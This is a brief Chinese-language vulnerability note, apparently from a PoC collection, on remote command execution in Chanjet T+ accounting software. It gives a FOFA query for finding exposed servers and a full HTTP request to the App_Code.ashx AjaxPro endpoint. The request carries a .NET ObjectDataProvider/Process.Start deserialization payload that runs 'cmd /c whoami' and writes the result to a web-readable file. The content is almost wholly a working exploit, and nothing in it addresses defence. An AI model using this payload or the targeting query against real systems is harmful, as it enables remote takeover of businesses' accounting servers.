## 畅捷通TPlus-App_Code.ashx存在远程命令执行漏洞

## fofa
```
app="畅捷通-TPlus"
```

## poc
```
POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Host: 127.0.0.1
X-Ajaxpro-Method: GetStoreWarehouseByStore
Content-Type: application/x-www-form-urlencoded
Content-Length: 570

{
  "storeID":{
    "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "ObjectInstance":{
      "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
      "StartInfo":{
        "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "FileName":"cmd",
        "Arguments":"/c whoami > test1.txt"
      }
    }
  }
}
```

写入文件路径：http://127.0.0.1/tplus/test1.txt
